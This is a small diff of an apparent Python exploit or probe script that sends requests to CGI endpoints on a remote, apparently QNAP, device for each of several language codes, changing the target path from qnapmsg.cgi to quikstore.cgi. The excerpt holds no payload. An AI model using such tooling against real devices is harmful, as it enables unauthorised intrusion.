@@ -98,7 +98,7 @@ if __name__ == '__main__':
     # this isn't all of them but it is sufficient for our purposes
     langs = [ 'eng', 'cze', 'dan', 'ger', 'spa', 'fre', 'ita', 'jpn', 'kor', 'nor', 'pol', 'rus', 'fin', 'swe', 'dut', 'tur', 'tha' ]
     for lang in langs:  
-        target_url = args.protocol + args.rhost + ':' + str(args.rport) + '/cgi-bin/qnapmsg.cgi?lang=' + lang
+        target_url = args.protocol + args.rhost + ':' + str(args.rport) + '/quikstore.cgi?lang=' + lang
         print('[!] Attempting ' + target_url)
         requests.get(target_url, verify=False, timeout=10)
         
